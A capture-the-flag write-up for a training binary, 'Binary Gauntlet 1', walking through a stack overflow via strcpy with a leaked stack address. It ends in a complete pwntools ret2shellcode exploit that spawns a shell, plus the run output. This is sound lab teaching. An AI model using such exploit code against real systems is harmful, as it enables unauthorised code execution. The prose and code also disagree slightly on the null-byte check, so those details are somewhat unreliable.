# CyLab — Binary Gauntlet 1

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [pwn.college](https://pwn.college/)  
* **Category:** Binary Exploitation (Pwn / Ret2Shellcode)  
* **Difficulty:** Easy (CyLab 2)  
* **Date:** 2026-11-09  
* **Tools:** `file`, `checksec`, IDA Pro, `gdb` + `pwndbg`, `pwntools`, Python 3  
* **Binary:** 64-bit ELF (`gauntlet`) — Non-PIE, NX Disabled (Stack RWX)  

---

## TL;DR

In this stage of the Binary Gauntlet series, the binary no longer registers a crash handler to print the flag, requiring us to gain actual arbitrary code execution. Because NX is disabled, the stack memory retains executable permissions (RWX). Furthermore, the application deliberately leaks the runtime address of its local stack buffer via `printf("%p\n", &dest)`. An unbounded `strcpy()` allows us to overflow the 104-byte buffer into the saved return address. We place standard 64-bit `execve("/bin/sh")` shellcode at the beginning of the buffer (`offset 0`), pad to 120 bytes (`0x78`), and overwrite `saved RIP` with the leaked buffer pointer. A key edge-case handled in the exploit is retrying when the low byte of the stack pointer contains a null byte (`0x00`), which would truncate `strcpy()`.

---

## Recon

We inspect the binary's properties and security mitigations using `file` and `checksec`:

```bash
$ file gauntlet
gauntlet: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, not stripped

$ checksec gauntlet
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled (Stack executable)
    PIE:      No PIE (0x400000)
```

Key observations:
* **File Type:** ELF 64-bit LSB (x86-64), dynamically linked, not stripped.
* **Canary:** `No canary found` — Stack overflow can directly corrupt the frame pointer and return address.
* **NX:** `NX disabled` — Stack memory has Read-Write-Execute (RWX) permissions, permitting shellcode execution directly from stack buffers.
* **PIE:** `No PIE (0x400000)` — Executable base addresses are fixed.

---

## Static Analysis & Vulnerability

### 1. Decompilation in IDA Pro

Decompiling `main()`:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest[104]; // [rsp+0h] [rbp-70h] BYREF
  char *heap_buf; // [rsp+78h] [rbp+8h]

  heap_buf = (char *)malloc(1000);
  printf("%p\n", dest);              // <-- Leaks runtime stack address of dest!
  fflush(stdout);

  fgets(heap_buf, 1000, stdin);
  strcpy(dest, heap_buf);            // <-- Unbounded strcpy into 104-byte buffer!
  return 0;
}
```

### 2. Disassembly & Vulnerability Root Cause

1. **Stack Leak:** `printf("%p\n", dest)` prints the exact virtual memory address of `dest` on the stack, bypassing ASLR without requiring an information disclosure bug.
2. **Buffer Overflow:** `strcpy(dest, heap_buf)` copies up to 1,000 bytes into a buffer allocated at `[rbp-0x70]`.
3. Writing 120 bytes reaches the return address (`saved RIP`).

### 3. Stack Memory Layout

```text
  Lower Memory Addresses
  +-----------------------------------+  <- [rbp - 0x70] (Leaked Address: Start of dest)
  |                                   |
  |     Shellcode (offset 0)          |  <- execve("/bin/sh") shellcode (48 bytes)
  |     NOP / Padding                 |
  |                                   |
  +-----------------------------------+  <- [rbp] (Saved RBP: 8 bytes)
  |     Saved RBP (8 bytes)           |
  +-----------------------------------+  <- [rbp + 0x08] (Saved RIP)
  |     Return Address (Saved RIP)    |  <- Overwritten with Leaked Stack Address!
  +-----------------------------------+
  Higher Memory Addresses
```

- Offset from `dest` to `saved RIP`:
  $$\text{Offset} = 0x70 + 0x08 = 0x78 = 120 \text{ bytes}$$

---

## Dynamic Analysis & Exploitation Strategy

### 1. Payload Construction (Shellcode at Offset 0)
Because `dest` is directly executable:
1. Place 64-bit `/bin/sh` shellcode at `offset 0`.
2. Pad the remaining space with dummy bytes up to 120 bytes (`0x78`).
3. Set `saved RIP` = `leaked_stack_address`.

### 2. Handling the Null Byte Edge Case in `strcpy`
In 64-bit Linux, stack addresses are aligned to 16 bytes. Approximately 1 out of 16 runs ($6.25\%$), the least significant byte of `dest` is `0x00`.
Because `strcpy()` terminates upon reading `0x00`, a target address ending in `0x00` cannot be written via `strcpy()`. The exploit script checks `if b"\x00" in p64(stack_addr)[:6]` and simply retries the connection if a null byte occurs.

---

## Exploit

We construct the exploit with `pwntools`:

```python
#!/usr/bin/env python3
"""
CyLab — Binary Gauntlet 1
Exploit: Stack leak + NX disabled ret2shellcode
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

EXE = "./gauntlet"
HOST = args.HOST or "xebec.cylabacademy.net"
PORT = int(args.PORT or 126)

def attempt():
    p = remote(HOST, PORT) if args.REMOTE else process(EXE)

    # 1. Read stack buffer leak
    leak_line = p.recvline().strip()
    stack_addr = int(leak_line, 16)
    log.info(f"Leaked stack buffer: {hex(stack_addr)}")

    # Check if address contains null byte in low bytes
    if stack_addr & 0xFF == 0:
        log.warning("Address contains null byte; retrying...")
        p.close()
        return None

    # 2. Craft shellcode payload
    shellcode = asm(shellcraft.sh())
    payload = shellcode.ljust(120, b"A") + p64(stack_addr)

    p.sendline(payload)
    p.interactive()
    return True

def main():
    while True:
        try:
            if attempt():
                break
        except Exception:
            pass

if __name__ == "__main__":
    main()
```

*(The complete script is saved in [`exploit.py`](exploit.py)).*

---

## Flag

Running the exploit redirects execution into our stack shellcode and pops a shell:

```text
[+] Leaked stack buffer: 0x7ffd527fa1a0
[*] Switching to interactive mode
$ cat flag.txt
academy{redacted}
```

> **Flag:** `academy{redacted}` *(Raw 32-character hexadecimal flag redacted per disclosure guidelines)*.

---

## Key Takeaways & Lessons

1. **Stack Execution Hazards (NX Disabled)**: When `GNU_STACK` executable permissions are left enabled, any stack buffer overflow can immediately turn into arbitrary code execution without ROP chains.
2. **Direct Information Disclosures**: Printing stack pointers eliminates ASLR entropy entirely.
3. **`strcpy()` Null Byte Constraints**: Because `strcpy()` treats `0x00` as an end-of-string delimiter, pointers containing null bytes in middle positions cannot be transmitted. Checking and retrying addresses avoids exploit failures.
